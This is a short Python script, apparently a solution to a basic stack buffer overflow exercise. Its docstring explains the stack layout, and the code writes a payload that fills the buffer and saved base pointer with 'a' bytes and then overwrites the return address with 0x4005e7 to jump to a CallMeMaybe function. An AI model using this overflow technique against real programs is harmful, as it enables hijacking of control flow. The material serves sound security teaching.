"""
This solution for Stack buffer overflow basic is quite simple.
We can use 'readelf -a [elf-file]' in order to view the location of the CallMeMaybe function,
then we overflow the buffer so the main function will return to callMeMaybe.

The stack is as follows: PREVIOUS IP | PREVIOUS BP | BUFFER (at bp - 0x110)
so we just fill the buffer and the next 8 bytes with 'a', and then provide
the location that we want to execute.
"""

def main():
    with open('input', 'wb') as destfile:
        destfile.write(b'a' * (0x110 + 8) + int.to_bytes(0x4005e7, 8, 'little') + b'\n\x00')


if __name__ == '__main__':
    main()

